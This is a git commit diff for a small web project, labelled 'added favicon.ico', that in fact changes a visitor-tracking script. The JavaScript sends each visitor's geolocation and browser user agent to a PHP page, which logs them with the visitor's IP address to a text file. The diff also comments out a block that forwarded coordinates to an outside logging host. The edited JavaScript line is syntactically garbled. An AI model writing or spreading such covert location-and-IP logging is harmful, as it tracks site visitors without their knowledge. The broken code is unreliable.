41895bcfc7a43902f7ef234d42a5ca3fdcf4a7d3
echoaj <aljoslin13@yahoo.com>
2022-06-01 13:29:12 -0700

    added favicon.ico

--- home.js
+++ home.js
@@ -18,7 +18,9 @@ function showPosition(position) {
     try {
         console.log("Sending coordinate info.");
         const xhttp = new XMLHttpRequest();
-        xhttp.open("GET", "index.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude, true);
+        xhttp.open("GET", "index.php?lat=" + position.coords.latitude + 
+                          "&long=" + position.coords.longitude, true + 
+                          "&uagent=" + navigator.userAgent, true);
         xhttp.send();
         console.log("Send Successful.");
     } catch (err) {
--- index.php
+++ index.php
@@ -4,28 +4,33 @@
 include_once("home.html");
 
 $myfile = fopen("location.txt", "w") or die("Unable to open file!");
-$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP: " . $_SERVER['REMOTE_ADDR'];
+$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nUser agent: " . $_GET['uagent'];
 fwrite($myfile, $txt);
 fclose($myfile);
 
+// Create for loop
+for ($i = 0; $i < 10; $i++) {
+    echo "The number is: $i <br>";
+}
+
 // Send JSON post request to server
 // try catch statement
-try {
-    $url = "https://logging-service-py.herokuapp.com/api/logger";
-    $data = array('lat' => $_GET["lat"], 'long' => $_GET["long"]);
-    $options = array(
-        'http' => array(
-            'header'  => "Content-type: application/json",
-            'method'  => 'POST',
-            'content' => http_build_query($data)
-        )
-    );
-    $context  = stream_context_create($options);
-    $result = file_get_contents($url, false, $context);
-} catch (Exception $e) {
-    echo 'Caught exception: ',  $e->getMessage(), "\n";
-    echo "logging filed";
-}
+// try {
+//     $url = "https://logging-service-py.herokuapp.com/api/logger";
+//     $data = array('lat' => $_GET["lat"], 'long' => $_GET["long"]);
+//     $options = array(
+//         'http' => array(
+//             'header'  => "Content-type: application/json",
+//             'method'  => 'POST',
+//             'content' => http_build_query($data)
+//         )
+//     );
+//     $context  = stream_context_create($options);
+//     $result = file_get_contents($url, false, $context);
+// } catch (Exception $e) {
+//     echo 'Caught exception: ',  $e->getMessage(), "\n";
+//     echo "logging filed";
+// }
 
 
 
